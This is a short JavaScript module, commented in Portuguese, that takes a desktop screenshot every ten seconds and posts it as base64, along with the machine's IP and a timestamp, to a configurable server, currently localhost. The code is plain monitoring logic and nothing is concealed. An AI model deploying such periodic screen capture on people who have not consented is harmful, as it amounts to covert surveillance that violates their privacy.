import screenshot from 'screenshot-desktop';
import axios from 'axios';
import { userIP } from './machine-ip.js';

// URL do servidor onde as capturas serão enviadas
const serverUrl = 'http://localhost:8080/upload-image'; // Altere para a URL do seu servidor

// Função para enviar a captura de tela para o servidor
async function sendScreenshot(imageBase64) {
  try {
    const timestamp = new Date().toISOString(); // Formato: YYYY-MM-DDTHH:mm:ss.sssZ
    const data = {
      ip: userIP, // Inclui o IP no corpo da requisição
      image: imageBase64, // Imagem em Base64
      timestamp: timestamp
    };


    // Envia os dados para o servidor
    const response = await axios.post(serverUrl, data);
    console.log(`Screenshot enviada, Status: ${response.status}`);
  } catch (error) {
    console.error(`Erro ao enviar a screenshot:`, error.message);
  }
}


// Função para capturar a tela
async function captureScreen() {
  try {
    const image = await screenshot();

    // Converte a imagem para Base64
    const imageBase64 = image.toString('base64');

    // Envia a captura de tela para o servidor
    await sendScreenshot(imageBase64);

  } catch (error) {
    console.error('Erro ao capturar a tela:', error.message);
  }
}


// Função para configurar o gatilho de captura
const setupScreenshotTrigger = (interval = 10000) => {
  setInterval(captureScreen, interval); // Captura a cada X milissegundos
};

// Exporta a função de configuração do gatilho
export { setupScreenshotTrigger };
